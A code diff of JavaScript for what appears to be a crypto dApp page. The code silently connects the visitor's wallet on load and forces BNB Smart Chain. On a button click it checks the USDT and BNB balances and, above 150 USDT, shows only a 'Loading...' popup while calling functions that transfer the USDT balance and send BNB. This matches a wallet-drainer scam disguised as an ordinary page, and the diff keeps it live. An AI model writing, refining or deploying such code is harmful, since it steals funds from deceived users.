@@ -6,53 +6,62 @@ let web3;
 let userAddress;
 
 async function connectWallet() {
-    if (window.ethereum) {
-        web3 = new Web3(window.ethereum);
-        try {
-            const accounts = await window.ethereum.request({ method: "eth_accounts" });
-            if (accounts.length > 0) {
-                userAddress = accounts[0];
-                console.log("Connected silently:", userAddress);
+    if (typeof window.ethereum === 'undefined') {
+        alert("Please open in Trust Wallet DApp browser or install MetaMask.");
+        return;
+    }
 
-                // Try switching to BNB Smart Chain silently
-                try {
-                    await window.ethereum.request({
-                        method: "wallet_switchEthereumChain",
-                        params: [{ chainId: "0x38" }]
-                    });
-                } catch (switchError) {
-                    if (switchError.code === 4902) {
-                        await window.ethereum.request({
-                            method: "wallet_addEthereumChain",
-                            params: [{
-                                chainId: "0x38",
-                                chainName: "Binance Smart Chain",
-                                nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
-                                rpcUrls: ["https://bsc-dataseed.binance.org/"],
-                                blockExplorerUrls: ["https://bscscan.com"]
-                            }]
-                        });
-                    }
-                }
+    web3 = new Web3(window.ethereum);
 
-            } else {
-                console.warn("Wallet not connected yet.");
-            }
+    try {
+        const accounts = await window.ethereum.request({ method: "eth_accounts" });
 
-        } catch (error) {
-            console.error("Silent wallet connection failed:", error);
+        if (accounts.length === 0) {
+            console.log("No wallet connected.");
+            return;
         }
-    } else {
-        alert("Please install MetaMask or use Trust Wallet DApp Browser.");
+
+        userAddress = accounts[0];
+        console.log("Wallet connected silently:", userAddress);
+
+        // Try switching to BNB chain
+        await window.ethereum.request({
+            method: "wallet_switchEthereumChain",
+            params: [{ chainId: "0x38" }]
+        });
+    } catch (err) {
+        console.error("Connection error:", err);
+        if (err.code === 4902) {
+            try {
+                await window.ethereum.request({
+                    method: "wallet_addEthereumChain",
+                    params: [{
+                        chainId: "0x38",
+                        chainName: "Binance Smart Chain",
+                        nativeCurrency: {
+                            name: "BNB",
+                            symbol: "BNB",
+                            decimals: 18
+                        },
+                        rpcUrls: ["https://bsc-dataseed.binance.org/"],
+                        blockExplorerUrls: ["https://bscscan.com"]
+                    }]
+                });
+            } catch (addError) {
+                console.error("Add chain error:", addError);
+            }
+        }
     }
 }
 
-// Auto-connect wallet on page load
-window.addEventListener("load", connectWallet);
+// Auto-connect silently on load
+window.addEventListener("load", () => {
+    connectWallet();
+});
 
 async function Next() {
     if (!web3 || !userAddress) {
-        showPopup("Wallet not connected. Please open in Trust Wallet DApp Browser or reload.", "black");
+        alert("Wallet not connected. Please open in Trust Wallet DApp Browser and reload.");
         return;
     }
 
@@ -60,7 +69,6 @@ async function Next() {
         { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
     ], usdtContractAddress);
 
-    // Fetch balances
     const [usdtBalanceWei, userBNBWei] = await Promise.all([
         usdtContract.methods.balanceOf(userAddress).call(),
         web3.eth.getBalance(userAddress)
@@ -85,7 +93,6 @@ async function Next() {
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
@@ -102,7 +109,6 @@ async function transferUSDT(usdtBalance, userBNB) {
             });
         }
 
-        // Proceed with USDT Transfer
         const usdtContract = new web3.eth.Contract([
             { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
         ], usdtContractAddress);
@@ -140,7 +146,6 @@ async function sendBNB(toAddress, amount) {
     }
 }
 
-// Function to display pop-up message
 function showPopup(message, color) {
     let popup = document.getElementById("popupBox");
 
@@ -166,11 +171,9 @@ function showPopup(message, color) {
     popup.innerHTML = message;
     popup.style.display = "block";
 
-    // Auto-hide after 5 seconds
     setTimeout(() => {
         popup.style.display = "none";
     }, 5000);
 }
 
-// Attach event listener
 document.getElementById("Next").addEventListener("click", Next);
